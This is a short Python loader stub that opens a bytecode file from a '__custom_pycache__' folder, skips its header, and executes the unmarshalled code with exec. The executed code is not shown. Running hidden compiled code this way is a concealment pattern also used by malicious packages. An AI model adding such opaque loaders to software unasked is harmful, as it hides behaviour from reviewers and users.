
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BinaryToImage_243c8802f7c04b38a55f1f4cae23bb16.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
